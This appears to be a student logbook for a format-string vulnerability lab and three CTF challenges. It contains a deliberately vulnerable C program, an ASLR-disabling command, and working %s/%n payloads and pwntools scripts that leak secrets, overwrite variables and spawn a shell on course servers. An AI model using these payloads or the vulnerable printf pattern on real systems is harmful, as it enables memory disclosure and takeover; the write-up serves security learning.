# Format sting

### Preparation
* Shutting down countermeasures
we'll turn off the address randomization in order to make it easier to guess the heap and stack address.
```
$ sudo sysctl -w kernel.randomize_va_space=0
```

### Vulnerable file

```C
unsigned int target = 0x11223344;
char *secret = "A secret message\n";
void myprintf(char *msg) {
    // This line has a format-string vulnerability
    printf(msg);
}
int main(int argc, char **argv) {
    char buf[1500];
    int length = fread(buf, sizeof(char), 1500, stdin);
    printf("Input size: %d\n", length);
    myprintf(buf);
    return 1;
}
```
This file is clearly unsafe since the input from the user read in int main() is passed to a function which then calls printf, without having been checked.

### Environment Setup
* To simplify the attack, we'll turn off user address space randomization **to a function which then calls printf**.
* Our program will be compiled into both 64-bit and 32-bit (-m32 option).
* The program will also need to be compiled with the **-z execstack** option, in order, to make the stack executable.


## Task 1

Firstly we send a benign message to the server running in the docker container on 10.9.0.5
with the command:
```
$ echo hello | nc 10.9.0.5 9090
```
result:
![Alt text](images/logbook7/task1-benign.png)

We then were asked to crash the program which we achieved using the following input:

```
AAAA%n
```
This writes 4 to the address 0x41414141 which isn't a valid memory address, whcich ends up crashing the program

![Alt text](images/logbook7/task1-crash.png)


## Task 2 a

We concluded we need 64 %x to get the server to start printing the beggining of the user input, we checked this by sending AAAA as the 4 first bytes in our input followed by 64 %x.

![Alt text](images/logbook7/task2-a.png)

## Task 2 b

To print the string of the secret value given its address = 0x080b4008, we need to use the %s specifier, however we need to specify the address we want the %s to read from. 
To do so, we wrote the address of the variable in little endian followed by %64$s which reads a string in the address present in the 64th position in stack (our input)

``` py
content = (0x080b4008).to_bytes(4,byteorder='little') + b"%64$s"
```

![Alt text](images/logbook7/task2-b.png)


## Task 3 a

To change the value of a variable using a format string vulnerabilities we need to use the %n which writes the number of characters written so far in the specified address. We used the same technique we used in task 2b

```py
content = (0x080e5068).to_bytes(4,byteorder='little') + b"%64$n"
```

![Alt text](images/logbook7/task3-a.png)

## Task 3 b

This task is the same as the task 3b, however we need to write 0x5000 to the address of the target variable, which means we need to write 20480 characters before calling %n. We can achieve this using %20476x which will write 20476 charcters in the user input.
These amount of characters is enough because we've already written 4 characters when we wrote the address we want to write to.

```py
content = (0x080e5068).to_bytes(4,byteorder='little') +b"%20476x" + b"%64$n"
```

![Alt text](images/logbook7/task3-b.png)





# CTF 7 Format Strings

## Desafio 1

In  the port 4004 there was a C program running, with a format string vulnerability present in the line 27:
```C
printf(buffer)```

The program had the following protections:

-> NX: Cannot execute in the Stack
-> Canarys: Cannot overflow buffers

```
checksec program
  Arch:     i386-32-little
  RELRO:    Partial RELRO
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE (0x8048000) ```


Apart from this we also foundout the Binary position is absolute (no PIE) and the binary is 32-bit.


The vulnerable file loads the global variable flag with the contents of flag.txt at the beggining of program. Therefore to find the flag all we need to do is print the content of flag.

First we used gdb to get the flag variable address.


![Alt text](images/logbook7/ctf1_gdb.png)

After getting the address 0x804c060, the exploit consists in getting the string value in that address, which can be achieved with the format specifier %s.


```py
p = remote("ctf-fsi.fe.up.pt", 4004)
p.recvuntil(b"got:")
p.sendline(p32(0x804c060) + b"%s")
p.interactive()
```

![Alt text](images/logbook7/ctf1_res.png)
```
flag{669369e1c6689eb5de7c38c2feef0c95}
```

## Desafio 2

For this challenge, the checkseck result is the same as the one for challenge 1, however this time the flag is not loaded into memory. Instead, if the key value is 0xBEEF a shell will be launched, which then can be used to read the contents of the flag.txt file in the same directory.

We start by using gdb to get the address of the key global variable.

![Alt text](images/logbook7/ctf2_gdb.png)
0x804b324

Then we need to write to this address using the %n format specifier.
This specifier writes the number of bytes written so far into the next address in the stack.
Therefore we calculated the value in decimal we need to write besides the 4 bytes we had already written in the address:
```
0xBEEF - 4 = 
 48879 - 4 = 48875
```
  
Then we just needed to put everything together in the exploit.

```py
r = remote('ctf-fsi.fe.up.pt', 4005)
r.recvuntil(b"here...")
r.sendline(p32(0x804b324) +b"%1$.48875x" + b"%n")
r.interactive()
```
![Alt text](images/logbook7/ctf2_res.png)
```
flag{aade366f8dc239bab6f89db1f010b512}
```



## Desafio 3

Challenge 3's source code was identical to the source code in challenge number 2. However this time the address of the key global variable was 0x804b320.

![Alt text](images/logbook7/ctf3_gdb.png)

This is doesn't allow to use the same approach we used in challenge 2 as \x20 is the ascii representation of the space character which messes with the address we want to write to.

Therefore, we tried to write 0xBEEF00 to the address immediately before: 0x804b31F.

However the decimal representation of 0xBEEF00 is 12513024, which would require us to write that amount of characters in the input, and consequently get a connection timeout before we could print the contents of flag.txt in the terminal.

In order to go around this obstacle we decided to split the writing of the variable into 2.

0x804b321 -> 0xBE = 190
0x804b31F -> 0xEF00 = 61184

This approach drastically reduces the amount of characters we need to write while getting the same result.

This led to the exploit:

```py
r = remote('ctf-fsi.fe.up.pt', 4008)
r.recvuntil(b"here...")
r.sendline(p32(0x804b321) + p32(0x804b31F) + b"%182x" + b"%1$hhn" + b"%60994x" + b"%2$hn")
r.interactive()
```

![Alt text](images/logbook7/ctf3_res.png)
```
flag{8e9f922b23b061c32d1b2802bd363057}
```





